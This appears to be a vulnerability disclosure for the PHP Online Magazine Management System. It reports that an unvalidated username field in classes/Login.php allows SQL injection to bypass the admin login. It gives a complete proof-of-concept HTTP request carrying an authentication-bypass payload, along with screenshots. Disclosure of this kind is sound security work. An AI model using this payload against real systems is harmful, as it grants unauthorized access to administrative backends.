# Online Magazine Management System  Bypass login to enter the backend

## Description

    In classes/Login.php, the username parameter is not validated, and SQLI injection can be used to bypass the login process and enter the backend.

## Affects Plugins

    Online Magazine Management System
    https://www.sourcecodester.com/php/15061/online-magazine-management-system-php-free-source-code.html

## Author

    yangfan2@webray.com.cn inc  

## Proof of Concept

sink

| ![image-20250910163629254](https://raw.githubusercontent.com/0xffaaa/cve/refs/heads/main/Online%20Magazine%20Management%20System%20%20Bypass%20login%20to enter%20the%20backend.assets/image-20250910163629254.png) |
| ------------------------------------------------------------ |

POC

```php
POST /magazines/classes/Login.php?f=login HTTP/1.1
Host: 10.211.55.3
Content-Length: 39
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Origin: http://10.211.55.3
Referer: http://10.211.55.3/magazines/admin/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=hnqeqgpe4vminlft80be2vrcej
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="92", "Google Chrome";v="92"
sec-ch-ua-mobile: ?0
Connection: keep-alive

username=admin'or+'1'%3D'1&password=123



```

Vulnerability verification

| ![image-20250910163658187](https://raw.githubusercontent.com/0xffaaa/cve/refs/heads/main/Online%20Magazine%20Management%20System%20%20Bypass%20login%20to enter%20the%20backend.assets/image-20250910163658187.png) |
| ------------------------------------------------------------ |
